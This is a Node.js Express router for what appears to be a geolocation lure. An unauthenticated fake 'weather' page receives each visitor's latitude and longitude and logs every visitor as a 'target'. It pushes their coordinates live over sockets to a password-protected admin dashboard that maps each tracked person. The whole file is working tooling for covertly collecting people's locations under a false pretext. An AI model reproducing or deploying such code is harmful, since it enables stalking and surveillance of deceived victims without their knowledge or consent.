const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}


// =======================
// LOGIN PAGE
// =======================

router.route("/login")
.get((req,res)=>{

    res.render("login")

})
.post((req,res)=>{


    const {username,password}=req.body


    if(
        config.username === username &&
        config.password === password
    ){

        res.cookie(
            "token",
            config.token,
            {
                maxAge:1000000 * 100000
            }
        )


        return res.redirect("/")

    }


    res.redirect("/login")


})




// =======================
// TARGET WEATHER PAGE
// NO LOGIN REQUIRED
// =======================

router.route("/weather")
.get((req,res)=>{


    res.render("weather")


})


.post((req,res)=>{


    const {
        id,
        lat,
        lng
    } = req.body



    if(TARGETS[id] == null){


        IO.emit(
            "user-connected",
            id
        )


    }



    TARGETS[id] = [

        Number(lat),
        Number(lng)

    ]



    IO.emit(
        "map-data",
        {

            id,
            lat,
            lng

        }
    )



    console.log(
        `> ${id} - ${lat}, ${lng}`
    )



    res.json({
    success: true
});


})





// =======================
// ADMIN AUTH MIDDLEWARE
// =======================


router.use((req,res,next)=>{


    const token=req.cookies.token



    if(
        token &&
        token === config.token
    ){

        next()

    }
    else{

        res.clearCookie("token")

        res.redirect("/login")

    }


})





// =======================
// ADMIN HOME
// =======================


router.get("/",(req,res)=>{


    res.render(
        "home",
        {

            TARGETS,

            remoteURL:global.remoteURL

        }
    )


})





// =======================
// SINGLE TARGET MAP
// =======================


router.get("/map",(req,res)=>{


    const {id}=req.query



    res.render(
        "map",
        {

            data:TARGETS[id]

        }
    )


})




module.exports = router